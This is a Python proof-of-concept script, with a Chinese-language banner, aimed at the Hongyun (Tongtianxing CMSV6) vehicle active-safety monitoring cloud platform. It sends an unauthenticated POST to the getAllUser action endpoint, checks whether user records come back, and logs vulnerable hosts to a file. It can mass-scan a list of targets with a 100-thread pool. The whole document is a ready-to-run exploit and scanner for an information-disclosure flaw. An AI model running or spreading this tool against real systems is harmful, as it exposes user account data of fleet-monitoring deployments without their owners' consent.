import requests,argparse,re,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
██╗  ██╗██╗   ██╗████████╗ ██████╗ ███╗   ██╗ ██████╗████████╗██╗ █████╗ ███╗   ██╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██║  ██║╚██╗ ██╔╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝██║██╔══██╗████╗  ██║╚██╗██╔╝██║████╗  ██║██╔════╝ 
███████║ ╚████╔╝    ██║   ██║   ██║██╔██╗ ██║██║  ███╗  ██║   ██║███████║██╔██╗ ██║ ╚███╔╝ ██║██╔██╗ ██║██║  ███╗
██╔══██║  ╚██╔╝     ██║   ██║   ██║██║╚██╗██║██║   ██║  ██║   ██║██╔══██║██║╚██╗██║ ██╔██╗ ██║██║╚██╗██║██║   ██║
██║  ██║   ██║      ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ██║██║  ██║██║ ╚████║██╔╝ ██╗██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                                                                                               
                                                           version:鸿运(通天星CMSV6车载)主动安全监控云平台
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description='鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url,args.file)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\t python:{sys.argv[0]} -h")

def poc(target):
    payload = '/808gps/StandardLoginAction_getAllUser.action'
    url = target+payload
    header = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Length": "11",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data ='''json=null'''
    try:
        res = requests.get(url=target,verify=False,timeout=10)
        if res.status_code == 200:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
            if res1.status_code == 200 and '"id":1' in res1.text:
                print(f"[+]此url{target}存在漏洞")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
            else:
                print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试")

if __name__ == '__main__':
    main()
